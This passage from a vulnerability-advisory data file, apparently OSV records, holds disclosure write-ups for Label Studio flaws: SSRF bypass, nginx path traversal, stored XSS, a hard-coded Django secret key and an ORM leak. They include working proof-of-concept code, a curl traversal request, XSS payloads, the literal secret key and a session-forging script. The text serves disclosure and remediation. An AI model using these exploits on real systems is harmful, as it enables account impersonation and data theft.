SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses 